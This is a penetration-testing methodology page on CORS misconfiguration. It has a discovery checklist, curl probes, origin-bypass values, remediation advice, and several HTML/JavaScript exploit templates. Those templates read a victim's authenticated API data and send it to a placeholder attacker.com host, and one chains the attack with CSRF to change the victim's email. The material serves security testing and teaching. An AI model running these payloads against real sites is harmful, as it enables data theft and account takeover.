---
title: "CORS Misconfiguration"
date: 2026-02-24
draft: false
---

# CORS Misconfiguration

> **Severity**: High | **CWE**: CWE-942
> **OWASP**: A01:2021 – Broken Access Control

---

## What Is CORS?

Cross-Origin Resource Sharing (CORS) allows browsers to make cross-origin requests. A server opts in by returning `Access-Control-Allow-Origin` headers. The vulnerability occurs when the server **reflects the attacker's origin**, allows **null origin**, or uses overly broad wildcards — combined with `Access-Control-Allow-Credentials: true` — letting an attacker's site read authenticated responses from the victim's browser.

```
Normal same-origin: browser blocks cross-origin reads (by default)
CORS misconfigured: server says "yes, attacker.com can read my responses"
                    → attacker.com JS reads victim's authenticated API data
```

**Key rule**: `Access-Control-Allow-Origin: *` with `Access-Control-Allow-Credentials: true` is **spec-forbidden** — browsers reject it. The dangerous case is when the server dynamically reflects a specific origin.

---

## Discovery Checklist

- [ ] Send `Origin: https://attacker.com` — does response reflect it in `Access-Control-Allow-Origin`?
- [ ] Send `Origin: null` — does response return `Access-Control-Allow-Origin: null`?
- [ ] Check: is `Access-Control-Allow-Credentials: true` present alongside a reflected origin?
- [ ] Test origin variations: subdomain, prefix, suffix, arbitrary subdomain
- [ ] Test pre-flight (OPTIONS) — what methods/headers are allowed?
- [ ] Test on all API endpoints, not just the main domain
- [ ] Check internal APIs (often more permissive)
- [ ] Look for endpoints returning sensitive data (tokens, PII, keys)

---

## Payload Library

### Test 1 — Reflected Origin

```bash
# Send arbitrary origin:
curl -s -H "Origin: https://attacker.com" \
     -H "Cookie: session=VALID_SESSION" \
     https://target.com/api/user-info \
     -I | grep -i "access-control"

# Vulnerable response:
# Access-Control-Allow-Origin: https://attacker.com
# Access-Control-Allow-Credentials: true
```

### Test 2 — Null Origin

```bash
# null origin bypass (sandbox iframe trick):
curl -s -H "Origin: null" \
     -H "Cookie: session=VALID_SESSION" \
     https://target.com/api/user-info \
     -I | grep -i "access-control"

# Vulnerable response:
# Access-Control-Allow-Origin: null
# Access-Control-Allow-Credentials: true
```

### Test 3 — Origin Validation Bypass

```bash
# If server checks that origin "starts with" target.com:
Origin: https://target.com.attacker.com       # ← starts with target.com
Origin: https://target.com.evil.io

# If server checks that origin "ends with" target.com:
Origin: https://attackertarget.com            # ← ends with target.com
Origin: https://notrealtarget.com

# If server checks domain contains target.com:
Origin: https://target.com.attacker.com

# Subdomain wildcard (if *.target.com trusted):
Origin: https://evil.target.com               # ← if you control a subdomain

# HTTP instead of HTTPS:
Origin: http://target.com                     # ← different origin
```

### Test 4 — Exploit Template (Authenticated Data Theft)

```html
<!-- Host on attacker.com, send link to authenticated victim -->
<!-- When victim visits: their browser sends cookies to target.com,
     CORS allows attacker.com to read the response -->

<html>
<body>
<script>
fetch('https://target.com/api/user-info', {
  credentials: 'include'    // sends victim's cookies
})
.then(r => r.json())
.then(data => {
  // Send stolen data to attacker server:
  fetch('https://attacker.com/log?d=' + encodeURIComponent(JSON.stringify(data)));
});
</script>
</body>
</html>
```

### Test 5 — XHR Version (older browser compat)

```html
<script>
var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
  if(xhr.readyState == 4) {
    fetch('https://attacker.com/log?d=' + encodeURIComponent(xhr.responseText));
  }
};
xhr.open('GET', 'https://target.com/api/account', true);
xhr.withCredentials = true;  // send cookies
xhr.send();
</script>
```

### Test 6 — null Origin via Sandboxed iframe

```html
<!-- Browser sends Origin: null from sandboxed iframe -->
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="
  <script>
    fetch('https://target.com/api/sensitive', {credentials:'include'})
    .then(r=>r.text())
    .then(d=>location='https://attacker.com/log?d='+encodeURIComponent(d));
  </script>
"></iframe>
```

### Test 7 — CORS + CSRF Chain

```html
<!-- If CORS allows reading CSRF tokens, chain with CSRF: -->
<script>
fetch('https://target.com/account/settings', {credentials:'include'})
.then(r=>r.text())
.then(html=>{
  // Extract CSRF token:
  let csrf = html.match(/csrf[^"]*"([a-f0-9]{32,})/i)[1];

  // Use token to make state-changing request:
  return fetch('https://target.com/account/email/change', {
    method: 'POST',
    credentials: 'include',
    headers: {'Content-Type':'application/x-www-form-urlencoded'},
    body: 'email=attacker@evil.com&csrf='+csrf
  });
})
.then(r=>fetch('https://attacker.com/done?status='+r.status));
</script>
```

---

## Tools

```bash
# CORScanner — automated CORS misconfiguration scanner:
git clone https://github.com/chenjj/CORScanner
python3 cors_scan.py -u https://target.com

# corsy — fast CORS scanner:
git clone https://github.com/s0md3v/Corsy
python3 corsy.py -u https://target.com

# Manual curl test:
for origin in "https://attacker.com" "null" "https://target.com.attacker.com" \
              "https://attackertarget.com" "http://target.com"; do
  echo -n "Origin: $origin → "
  curl -s -H "Origin: $origin" https://target.com/api/ -I 2>/dev/null | \
    grep -i "access-control-allow-origin"
done

# Burp Suite: add Origin header to all requests in Proxy settings
# Search Burp history for "Access-Control-Allow-Credentials: true"
```

---

## Remediation Reference

- **Never reflect the `Origin` header** back as `Access-Control-Allow-Origin` without validating against an explicit allowlist
- **Allowlist exact origins**: `["https://app.company.com", "https://admin.company.com"]` — no substring matching
- **Never allow `Origin: null`** in production
- **Avoid wildcard `*`** combined with credentials — browsers block it but configure explicitly
- **Treat CORS as defense-in-depth**: proper authorization on server-side regardless of CORS settings

*Part of the Web Application Penetration Testing Methodology series.*
